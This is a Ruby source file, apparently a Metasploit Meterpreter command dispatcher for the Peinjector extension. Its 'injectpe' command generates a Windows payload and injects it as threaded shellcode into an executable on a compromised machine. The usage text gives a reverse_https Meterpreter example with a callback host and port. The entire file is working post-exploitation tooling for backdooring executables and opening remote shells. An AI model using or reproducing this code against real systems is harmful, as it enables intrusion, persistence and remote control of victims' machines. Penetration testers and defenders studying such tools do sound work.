# -*- coding: binary -*-
require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

###
#
# Peinjector extension - inject a given shellcode into an executable file
#
###
class Console::CommandDispatcher::Peinjector

  Klass = Console::CommandDispatcher::Peinjector

  include Console::CommandDispatcher

  #
  # Name for this dispatcher
  #
  def name
    'Peinjector'
  end

  #
  # List of supported commands.
  #
  def commands
    {
      'injectpe'  => 'Inject a shellcode into a given executable'
    }
  end


  @@injectpe_opts = Rex::Parser::Arguments.new(
    '-p' => [true, 'Windows Payload to inject into the targer executable.'],
    '-t' => [true, 'Path of the target executable to be injected'],
    '-o' => [true, 'Comma separated list of additional options for payload if needed in \'opt1=val,opt2=val\' format.'],
    '-h' => [false, 'Help banner']
  )

  def injectpe_usage
    print_line('Usage: injectpe -p < windows/meterpreter/reverse_https > -t < c:\target_file.exe >, -o < lhost=192.168.1.123, lport=4443 >')
    print_line
    print_line('Inject a shellcode on the target executable.')
    print_line(@@injectpe_opts.usage)
  end

  #
  # Inject a given shellcode into a remote executable
  #
  def cmd_injectpe(*args)
    if args.length == 0 || args.include?('-h')
	    injectpe_usage
      return false
    end

    opts = {
      payload: nil,
      targetpe: nil,
      options: nil
    	}

    @@injectpe_opts.parse(args) { |opt, idx, val|
      case opt
      when '-p'
        opts[:payload] = val
      when '-t'
        opts[:targetpe] = val
      when '-o'
        opts[:options] = val
      end
    }
    payload = create_payload(opts[:payload], opts[:options])

    inject_payload(payload, opts[:targetpe])
  end

  # Create a payload given a name, lhost and lport, additional options
  def create_payload(name, opts = "")

    pay = client.framework.payloads.create(name)
    pay.datastore['EXITFUNC'] = 'thread'
    pay.available_space = 1.gigabyte # this is to generate a proper uuid and make the payload to work with the universal handler

    if not opts.blank?
      opts.split(",").each do |o|
      opt,val = o.split("=",2)
      pay.datastore[opt] = val
      end
    end

    # Validate the options for the module
    pay.options.validate(pay.datastore)
    return pay
  end

  def inject_payload(pay, targetpe)

    begin
      print_status("Generating payload")
      raw = pay.generate
      param = {}

      if pay.arch.join == ARCH_X64
        threaded_shellcode = client.peinjector.add_thread_x64(raw)
        param[:isx64] = true
      else
        threaded_shellcode = client.peinjector.add_thread_x86(raw)
        param[:isx64] = false
      end

      param[:shellcode] = threaded_shellcode
      param[:targetpe] = targetpe
      param[:size] = threaded_shellcode.length;

      print_status("Injecting #{pay.name} into the executable #{targetpe}")
      client.peinjector.inject_shellcode(param)
      print_good("Successfully injected payload into the executable: #{targetpe}")

    rescue ::Exception => e
      print_error("Failed to Inject Payload to executable #{targetpe}!")
      print_error(e.to_s)
    end
  end

end

end
end
end
end

